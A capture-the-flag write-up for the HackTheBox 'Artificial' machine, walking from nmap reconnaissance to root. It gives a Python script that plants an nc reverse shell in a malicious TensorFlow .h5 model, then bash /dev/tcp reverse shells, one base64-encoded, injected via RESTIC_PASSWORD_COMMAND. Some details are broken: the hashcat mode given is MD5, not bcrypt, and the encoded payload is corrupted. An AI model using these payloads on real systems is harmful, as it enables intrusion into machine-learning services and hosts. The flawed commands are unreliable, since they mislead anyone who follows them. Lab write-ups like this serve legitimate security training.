# HackTheBox - Artificial (Write-up)

This is a detailed write-up of the **Artificial** machine on
HackTheBox.\
The objective was to exploit vulnerabilities in malicious TensorFlow
models to achieve remote code execution (RCE), escalate privileges, and
capture the `user.txt` and `root.txt` flags.

------------------------------------------------------------------------

## Reconnaissance

Running **nmap** to identify open ports:

``` bash
nmap -sCVT 10.10.11.74
```

Result:

    PORT   STATE SERVICE VERSION
    22/tcp open ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
    80/tcp open http    nginx 1.18.0 (Ubuntu)

-   HTTP service redirected to `http://artificial.htb/`.

------------------------------------------------------------------------

## Initial Access

It was possible to create a demo account to explore the application.\
The system allowed uploading `.h5` files (TensorFlow models).

Discovery: remote code execution (RCE) vulnerability in TensorFlow model
loading.

------------------------------------------------------------------------

## TensorFlow Exploitation

Python exploit to create a malicious `.h5` file:

``` python
import tensorflow as tf
import os

def exploit(x):
    os.system("rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.xx.xx 4444 >/tmp/f")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```

Building the container to generate the malicious model:

``` bash
docker run -it --rm -v "$PWD":/app -w /app tensorflow/tensorflow:2.13.0 python3 exploit.py
```

Upload `exploit.h5` in the Web UI → **View Predictions** → reverse shell
obtained.

------------------------------------------------------------------------

## Container Access

After the upload, spawn an interactive shell:

``` bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Now we have initial access inside the container.

------------------------------------------------------------------------

## Privilege Escalation

A `config.json` file was found inside `.config/backrest/`:

``` bash
cat .config/backrest/config.json
```

Credentials (bcrypt):

    "user": "backrest_root",
    "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"

Password bruteforce with hashcat:

``` bash
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

Exploiting the environment variable `RESTIC_PASSWORD_COMMAND` for a
persistent reverse shell:

``` bash
echo "bash -i >& /dev/tcp/10.10.xx.xx/4444 0>&1" | base64
```

Usage in ENV:

``` bash
RESTIC_PASSWORD_COMMAND=echo "YmFzaCAtaSA+JiAvZGVzxL3RjcC8xMC4xMC4xNi4xMzUvNDQ0NCAwPiYxCg==" | base64 -d | bash
```

For long-term persistence:

``` bash
RESTIC_PASSWORD_COMMAND=bash -c 'bash -i >& /dev/tcp/10.10.xx.xxx/4444 0>&1'
```

------------------------------------------------------------------------

## Flags

After root access:

``` bash
cat /home/user/user.txt
cat /root/root.txt
```

------------------------------------------------------------------------

## Conclusion

The **Artificial** machine demonstrated critical flaws in Machine
Learning pipelines:

1.  **Nmap** revealed SSH and HTTP.\
2.  **TensorFlow RCE** via malicious `.h5` upload.\
3.  **Reverse shell** through injected code in the model.\
4.  **Config.json** exposed sensitive credentials.\
5.  **Privilege escalation** via `RESTIC_PASSWORD_COMMAND`.\
6.  Successfully captured both flags.

```{=html}
<!-- -->
```
    Status: PWNED 🏴‍☠️
